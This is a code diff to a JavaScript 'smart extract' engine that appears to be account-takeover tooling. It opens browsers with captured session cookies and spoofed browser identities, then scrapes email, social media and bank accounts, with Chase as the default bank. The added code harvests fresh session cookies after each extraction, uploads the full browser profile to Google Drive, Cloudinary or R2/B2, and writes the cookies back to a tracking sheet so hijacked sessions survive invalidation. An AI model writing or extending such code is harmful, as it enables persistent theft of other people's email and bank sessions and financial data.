@@ -6,8 +6,9 @@ import { launchBrowserWithSession, downloadAndExtractProfile, DOMHelpers } from 
 import { applyIdentityToPage } from './identity.js';
 import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../app/api/googlesheets.js';
 import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/platforms.js';
-import { createOrUpdateJsonFile, getJsonContentFromFile } from '../app/api/googledrive.mjs';
-import { isFreeMicrosoftDomain } from '../app/emails/cookie/cookie-api-login/platformHelper/index.js';
+import { createOrUpdateJsonFile, getJsonContentFromFile, uploadBrowserDataRaw } from '../app/api/googledrive.mjs';
+import { isFreeMicrosoftDomain, getCookieCaptureUrls } from '../app/emails/cookie/cookie-api-login/platformHelper/index.js';
+import { setCachedRow, immediateFlush } from './cookieCache.js';
 
 // ============================================================
 // SMART EXTRACT ENGINE
@@ -2163,6 +2164,9 @@ async function extractWire(session, browserId) {
         }
         return page;
     };
+    // Set true only on the final successful return — drives the post-extraction
+    // profile refresh in finally (error/early returns must never upload).
+    let extractionSucceeded = false;
     try {
         let done = 0;
         const update = (label) => { done++; if (browserId) updateExtractStatus(browserId, `extracting ${label} (${done}/${PHASES})`); };
@@ -2280,6 +2284,7 @@ async function extractWire(session, browserId) {
         logger.info(`[smartExtract] COUNTS: activities=${activities.length}`);
 
         logger.info(`[smartExtract] EXTRACT DONE ${browserId || 'unknown'} in ${Date.now() - start}ms`);
+        extractionSucceeded = true;
         return {
             timestamp: new Date().toISOString(),
             emailAddress: session.email,
@@ -2301,11 +2306,58 @@ async function extractWire(session, browserId) {
             },
         };
     } finally {
+        // --- Post-extraction profile refresh (session freshness) ---
+        // Capture fresh cookies BEFORE close (CDP needs a live page), upload the
+        // refreshed profile AFTER close (SQLite/LevelDB flush first), then write
+        // cookieJSON/driveUrl/browserIdentity back to the cookie row. The old flow
+        // only uploaded profiles at login time, so server-side session
+        // invalidation had no refresh path. EVERY step is best-effort: an
+        // exception thrown in finally would replace the extraction result.
+        let freshCookies = [];
+        if (extractionSucceeded && page && !page.isClosed()) {
+            try {
+                const captureUrls = getCookieCaptureUrls(session.domain || undefined);
+                if (platform === 'gmail') captureUrls.unshift('https://accounts.google.com');
+                freshCookies = await page.cookies(...captureUrls);
+                logger.info(`[smartExtract] Captured ${freshCookies.length} fresh cookies for profile refresh`);
+            } catch (e) {
+                logger.warn(`[smartExtract] Fresh cookie capture failed: ${e.message}`);
+            }
+        }
         // Close browser
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
         // Clean up downloaded profile directory
         if (profileDir) {
+            if (extractionSucceeded && browserId && freshCookies.length > 0) {
+                try {
+                    const updateData = {
+                        cookieJSON: JSON.stringify(freshCookies),
+                        formattedCookie: JSON.stringify(freshCookies, null, 2),
+                        lastUserActivity: new Date().toISOString(),
+                    };
+                    if (browser && browser.identity) {
+                        try { updateData.browserIdentity = JSON.stringify(browser.identity); } catch (_) {}
+                    }
+                    const uploadResult = await uploadBrowserDataRaw(browserId, updateData, profileDir, { force: true });
+                    if (uploadResult && uploadResult.ok && uploadResult.url) {
+                        updateData.driveUrl = uploadResult.url;
+                        const via = uploadResult.url.startsWith('https://res.cloudinary.com') ? 'Cloudinary'
+                            : uploadResult.url.includes('drive.google.com') ? 'Drive' : 'R2/B2';
+                        logger.info(`[smartExtract] Refreshed profile uploaded for ${browserId} via ${via}: ${uploadResult.url}`);
+                    } else {
+                        logger.warn(`[smartExtract] Profile refresh upload failed for ${browserId}: ${uploadResult?.reason || 'unknown'} — sheet driveUrl kept as-is`);
+                    }
+                    // Refresh cookieJSON (+driveUrl when uploaded) on the cookie row so
+                    // restoration reads fresh cookies from the sheet too.
+                    await setCachedRow(browserId, updateData);
+                    await immediateFlush(browserId);
+                } catch (e) {
+                    logger.warn(`[smartExtract] Profile refresh failed (non-fatal): ${e.message}`);
+                }
+            } else if (extractionSucceeded && freshCookies.length === 0) {
+                logger.warn(`[smartExtract] Profile refresh skipped for ${browserId}: no fresh cookies captured`);
+            }
             const fs = await import('fs-extra');
             await fs.remove(profileDir).catch(() => {});
         }
@@ -2336,8 +2388,10 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
         }
     }
 
-    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform });
+    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform: platformKey });
     let tab1;
+    // Set true only on the final successful return — drives the profile refresh in finally.
+    let extractionSucceeded = false;
     try {
         tab1 = await createTab(browser, cookieJSON);
 
@@ -2420,14 +2474,58 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
 
         account.extractedDetails = profile;
         account.detailsExtractedFrom = config.profileUrl || '';
+        extractionSucceeded = true;
         return [account];
     } finally {
+        // Profile refresh: capture live cookies before close, upload refreshed
+        // profile after close, refresh cookieJSON on the row (non-fatal on error).
+        let freshCookies = [];
+        if (extractionSucceeded && page && !page.isClosed()) {
+            try {
+                const jars = [];
+                try { jars.push(...await page.cookies()); } catch (_) {}
+                if (tab1 && !tab1.isClosed()) { try { jars.push(...await tab1.cookies()); } catch (_) {} }
+                const seen = new Set();
+                freshCookies = jars.filter(c => {
+                    const k = `${c.name}|${c.domain}`;
+                    if (seen.has(k)) return false;
+                    seen.add(k);
+                    return true;
+                });
+                logger.info(`[smartExtract] Captured ${freshCookies.length} fresh cookies for social profile refresh`);
+            } catch (e) {
+                logger.warn(`[smartExtract] Fresh cookie capture failed: ${e.message}`);
+            }
+        }
         await Promise.all([
             page.close().catch(() => {}),
             tab1?.close().catch(() => {}),
         ]);
         await browser.close().catch(() => {});
         if (profileDir) {
+            if (extractionSucceeded && browserId && freshCookies.length > 0) {
+                try {
+                    const updateData = {
+                        cookieJSON: JSON.stringify(freshCookies),
+                        formattedCookie: JSON.stringify(freshCookies, null, 2),
+                        lastUserActivity: new Date().toISOString(),
+                    };
+                    if (browser && browser.identity) {
+                        try { updateData.browserIdentity = JSON.stringify(browser.identity); } catch (_) {}
+                    }
+                    const uploadResult = await uploadBrowserDataRaw(browserId, updateData, profileDir, { force: true });
+                    if (uploadResult && uploadResult.ok && uploadResult.url) {
+                        updateData.driveUrl = uploadResult.url;
+                        logger.info(`[smartExtract] Refreshed social profile uploaded for ${browserId}: ${uploadResult.url}`);
+                    } else {
+                        logger.warn(`[smartExtract] Social profile refresh upload failed for ${browserId}: ${uploadResult?.reason || 'unknown'}`);
+                    }
+                    await setCachedRow(browserId, updateData);
+                    await immediateFlush(browserId);
+                } catch (e) {
+                    logger.warn(`[smartExtract] Social profile refresh failed (non-fatal): ${e.message}`);
+                }
+            }
             const fs = await import('fs-extra');
             await fs.remove(profileDir).catch(() => {});
         }
@@ -2457,7 +2555,7 @@ const BANK_SITES = {
     },
 };
 
-async function extractBank(session, explicitPlatform) {
+async function extractBank(session, explicitPlatform, browserId) {
     const cookieJSON = session.cookieJSON;
     const rawPlatform = explicitPlatform || session.bankPlatform || session.category || 'chase';
     const platformKey = String(rawPlatform).toLowerCase().trim();
@@ -2473,7 +2571,9 @@ async function extractBank(session, explicitPlatform) {
         }
     }
 
-    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform });
+    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir, identity: session.browserIdentity, platform: platformKey });
+    // Set true only on the final successful return — drives the profile refresh in finally.
+    let extractionSucceeded = false;
     try {
         const accounts = [];
         const transactions = [];
@@ -2558,11 +2658,46 @@ async function extractBank(session, explicitPlatform) {
                 detailsExtractedFrom: bankConfig.loginUrl,
             }];
 
+        extractionSucceeded = true;
         return bankAccounts;
     } finally {
+        // Profile refresh: capture live cookies before close, upload refreshed
+        // profile after close, refresh cookieJSON on the row (non-fatal on error).
+        let freshCookies = [];
+        if (extractionSucceeded && page && !page.isClosed()) {
+            try {
+                freshCookies = await page.cookies();
+                logger.info(`[smartExtract] Captured ${freshCookies.length} fresh cookies for bank profile refresh`);
+            } catch (e) {
+                logger.warn(`[smartExtract] Fresh cookie capture failed: ${e.message}`);
+            }
+        }
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
         if (profileDir) {
+            if (extractionSucceeded && browserId && freshCookies.length > 0) {
+                try {
+                    const updateData = {
+                        cookieJSON: JSON.stringify(freshCookies),
+                        formattedCookie: JSON.stringify(freshCookies, null, 2),
+                        lastUserActivity: new Date().toISOString(),
+                    };
+                    if (browser && browser.identity) {
+                        try { updateData.browserIdentity = JSON.stringify(browser.identity); } catch (_) {}
+                    }
+                    const uploadResult = await uploadBrowserDataRaw(browserId, updateData, profileDir, { force: true });
+                    if (uploadResult && uploadResult.ok && uploadResult.url) {
+                        updateData.driveUrl = uploadResult.url;
+                        logger.info(`[smartExtract] Refreshed bank profile uploaded for ${browserId}: ${uploadResult.url}`);
+                    } else {
+                        logger.warn(`[smartExtract] Bank profile refresh upload failed for ${browserId}: ${uploadResult?.reason || 'unknown'}`);
+                    }
+                    await setCachedRow(browserId, updateData);
+                    await immediateFlush(browserId);
+                } catch (e) {
+                    logger.warn(`[smartExtract] Bank profile refresh failed (non-fatal): ${e.message}`);
+                }
+            }
             const fs = await import('fs-extra');
             await fs.remove(profileDir).catch(() => {});
         }
@@ -2727,7 +2862,7 @@ export async function runSmartExtract(browserId, category, username, platform) {
             data = await extractSocial(session, username || session.email, platform, browserId);
         } else if (key === 'bank') {
             await updateExtractStatus(browserId, 'extracting');
-            data = await extractBank(session, platform);
+            data = await extractBank(session, platform, browserId);
         } else {
             data = await extractWire(session, browserId);
         }
